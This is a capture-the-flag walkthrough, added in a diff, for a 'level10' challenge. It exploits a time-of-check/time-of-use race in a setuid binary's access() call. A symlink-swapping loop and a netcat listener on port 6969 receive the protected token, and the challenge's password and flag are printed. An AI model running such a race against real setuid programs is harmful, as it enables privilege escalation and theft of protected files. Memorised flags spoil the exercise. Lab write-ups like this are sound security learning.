@@ -1,0 +1,47 @@
+> ls
+level10  token
+
+> ./level10
+./level10 file host
+        sends file to host if you have access to it
+
+> strings level10
+...
+...
+Connecting to %s:6969 ..
+...
+...
+
+> ltrace ./level10 token 192.168.1.235
+__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                              = -1
+printf("You don't have access to %s\n", "token"You don't have access to token
+)                = 31
++++ exited (status 31) +++
+
+> ls -l
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+
+If we search about access vulnerabilities we can easly found a time attack vulnerability
+https://stackoverflow.com/questions/7925177/access-security-hole
+
+
+Now we can split up in 3 terminals
+
+1 > while true; do ./level10 /tmp/tkn 192.168.1.235; done;
+
+2 > while true; do ln -fs ~/level10 /tmp/tkn; ln -fs ~/token /tmp/tkn; done
+
+3 > nc -k -l 6969
+...
+...
+woupa2yuojeeaaed06riuj63c
+...
+...
+
+> su flag10
+
+> getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
